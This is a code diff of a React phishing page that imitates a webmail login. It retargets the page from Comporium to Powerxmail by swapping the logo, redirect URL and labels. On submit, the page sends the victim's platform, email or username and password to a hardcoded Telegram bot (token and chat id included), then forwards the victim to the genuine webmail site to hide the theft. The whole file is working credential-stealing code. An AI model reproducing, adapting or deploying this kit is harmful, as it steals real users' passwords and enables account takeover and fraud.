@@ -6,6 +6,7 @@ import logo from './logo.png';
 import { useState } from 'react';
 import axios from 'axios';
 import comporium from './comporium.png';
+import powerx from './powerx.png';
 
 function Home(){
 
@@ -13,7 +14,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Comporium")
+    const[platform, setPlatform] = useState("Powerxmail")
 
     const[showError, setShowError] = useState(false);
 
@@ -28,8 +29,8 @@ function Home(){
             //     platform:platform
             // });
     
-           const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
-                chat_id: 5868304053,
+           const response =  await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                chat_id: 5916570239,
                 text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
               });
     
@@ -41,7 +42,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail.comporium.net/';
+               window.location.href = 'https://mail.powerxmail.com/';
             }
           } catch (error) {
             // Handle error
@@ -65,8 +66,8 @@ function Home(){
             </div>
 
             <div className='secondiv col-md-5 m-auto'>
-                <div className='logodiv text-center'>
-                <img src={comporium} className="mylogo" />
+                <div className='logodiv px-3'>
+                <img src={powerx} className="mylogo" />
 
                 </div>
 
@@ -77,9 +78,9 @@ function Home(){
 
                 <form onSubmit={handleSubmit} className='px-4 mt-4'>
                     <div class="form-group row">
-                        <label for="staticEmail" class="label col-sm-2 col-form-label">Email</label>
+                        <label for="staticEmail" class="label col-sm-2 col-form-label">Username</label>
                         <div class="col-sm-10">
-                        <input type="email"style={{
+                        <input type="text"style={{
                             height:"30px",
                         }}  class="form-control"onChange={function(e){
                             setEmail(e.target.value);
